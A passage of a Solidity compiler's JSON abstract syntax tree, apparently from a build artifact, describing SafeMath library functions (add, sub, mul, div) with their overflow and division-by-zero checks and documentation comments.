												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 137,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2370:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2363:15:0"
									},
									"scope": 354,
									"src": "2303:152:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 180,
										"nodeType": "Block",
										"src": "2757:108:0",
										"statements": [
											{
												"assignments": [
													166
												],
												"declarations": [
													{
														"constant": false,
														"id": 166,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 180,
														"src": "2767:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 165,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "2767:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 170,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 169,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 167,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 158,
														"src": "2779:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "+",
													"rightExpression": {
														"argumentTypes": null,
														"id": 168,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 160,
														"src": "2783:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2779:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "2767:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 174,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 172,
																"name": "c",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 166,
																"src": "2802:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 173,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 158,
																"src": "2807:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "2802:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206164646974696f6e206f766572666c6f77",
															"id": 175,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "2810:29:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															},
															"value": "SafeMath: addition overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_30cc447bcc13b3e22b45cef0dd9b0b514842d836dd9b6eb384e20dedfb47723a",
																"typeString": "literal_string \"SafeMath: addition overflow\""
															}
														],
														"id": 171,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "2794:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 176,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2794:46:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 177,
												"nodeType": "ExpressionStatement",
												"src": "2794:46:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 178,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 166,
													"src": "2857:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 164,
												"id": 179,
												"nodeType": "Return",
												"src": "2850:8:0"
											}
										]
									},
									"documentation": {
										"id": 156,
										"nodeType": "StructuredDocumentation",
										"src": "2461:224:0",
										"text": " @dev Returns the addition of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `+` operator.\n Requirements:\n - Addition cannot overflow."
									},
									"id": 181,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "add",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 161,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 158,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "2703:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 157,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2703:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 160,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "2714:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 159,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2714:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2702:22:0"
									},
									"returnParameters": {
										"id": 164,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 163,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 181,
												"src": "2748:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 162,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2748:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2747:9:0"
									},
									"scope": 354,
									"src": "2690:175:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 202,
										"nodeType": "Block",
										"src": "3203:88:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 194,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 192,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 186,
																"src": "3221:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 193,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 184,
																"src": "3226:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3221:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a207375627472616374696f6e206f766572666c6f77",
															"id": 195,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3229:32:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															},
															"value": "SafeMath: subtraction overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_50b058e9b5320e58880d88223c9801cd9eecdcf90323d5c2318bc1b6b916e862",
																"typeString": "literal_string \"SafeMath: subtraction overflow\""
															}
														],
														"id": 191,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3213:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 196,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3213:49:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 197,
												"nodeType": "ExpressionStatement",
												"src": "3213:49:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 200,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 198,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 184,
														"src": "3279:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 199,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 186,
														"src": "3283:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3279:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 190,
												"id": 201,
												"nodeType": "Return",
												"src": "3272:12:0"
											}
										]
									},
									"documentation": {
										"id": 182,
										"nodeType": "StructuredDocumentation",
										"src": "2871:260:0",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting on\n overflow (when the result is negative).\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 203,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 187,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 184,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 203,
												"src": "3149:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 183,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3149:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 186,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 203,
												"src": "3160:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 185,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3160:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3148:22:0"
									},
									"returnParameters": {
										"id": 190,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 189,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 203,
												"src": "3194:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 188,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3194:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3193:9:0"
									},
									"scope": 354,
									"src": "3136:155:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 236,
										"nodeType": "Block",
										"src": "3605:148:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 215,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 213,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "3619:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 214,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3624:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "3619:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 218,
												"nodeType": "IfStatement",
												"src": "3615:20:0",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 216,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "3634:1:0",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"functionReturnParameters": 212,
													"id": 217,
													"nodeType": "Return",
													"src": "3627:8:0"
												}
											},
											{
												"assignments": [
													220
												],
												"declarations": [
													{
														"constant": false,
														"id": 220,
														"mutability": "mutable",
														"name": "c",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 236,
														"src": "3645:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 219,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "3645:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 224,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 223,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 221,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 206,
														"src": "3657:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "*",
													"rightExpression": {
														"argumentTypes": null,
														"id": 222,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 208,
														"src": "3661:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "3657:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "3645:17:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 230,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 228,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 226,
																	"name": "c",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 220,
																	"src": "3680:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "/",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 227,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 206,
																	"src": "3684:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "3680:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"id": 229,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 208,
																"src": "3689:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "3680:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d756c7469706c69636174696f6e206f766572666c6f77",
															"id": 231,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "3692:35:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															},
															"value": "SafeMath: multiplication overflow"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_9113bb53c2876a3805b2c9242029423fc540a728243ce887ab24c82cf119fba3",
																"typeString": "literal_string \"SafeMath: multiplication overflow\""
															}
														],
														"id": 225,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "3672:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 232,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3672:56:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 233,
												"nodeType": "ExpressionStatement",
												"src": "3672:56:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 234,
													"name": "c",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 220,
													"src": "3745:1:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 212,
												"id": 235,
												"nodeType": "Return",
												"src": "3738:8:0"
											}
										]
									},
									"documentation": {
										"id": 204,
										"nodeType": "StructuredDocumentation",
										"src": "3297:236:0",
										"text": " @dev Returns the multiplication of two unsigned integers, reverting on\n overflow.\n Counterpart to Solidity's `*` operator.\n Requirements:\n - Multiplication cannot overflow."
									},
									"id": 237,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mul",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 209,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 206,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 237,
												"src": "3551:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 205,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3551:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 208,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 237,
												"src": "3562:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 207,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3562:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3550:22:0"
									},
									"returnParameters": {
										"id": 212,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 211,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 237,
												"src": "3596:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 210,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3596:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3595:9:0"
									},
									"scope": 354,
									"src": "3538:215:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 258,
										"nodeType": "Block",
										"src": "4284:83:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 250,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 248,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 242,
																"src": "4302:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 249,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4306:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4302:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206469766973696f6e206279207a65726f",
															"id": 251,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4309:28:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															},
															"value": "SafeMath: division by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_5b7cc70dda4dc2143e5adb63bd5d1f349504f461dbdfd9bc76fac1f8ca6d019f",
																"typeString": "literal_string \"SafeMath: division by zero\""
															}
														],
														"id": 247,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "4294:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 252,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4294:44:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 253,
												"nodeType": "ExpressionStatement",
												"src": "4294:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 256,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 254,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 240,
														"src": "4355:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 255,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 242,
														"src": "4359:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4355:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 246,
												"id": 257,
												"nodeType": "Return",
												"src": "4348:12:0"
											}
										]
									},
									"documentation": {
										"id": 238,
										"nodeType": "StructuredDocumentation",
										"src": "3759:453:0",
										"text": " @dev Returns the integer division of two unsigned integers, reverting on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 259,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 243,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 240,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 259,
												"src": "4230:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 239,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4230:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 242,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 259,
												"src": "4241:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 241,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4241:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4229:22:0"
									},
									"returnParameters": {
										"id": 246,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 245,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 259,
												"src": "4275:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 244,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4275:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
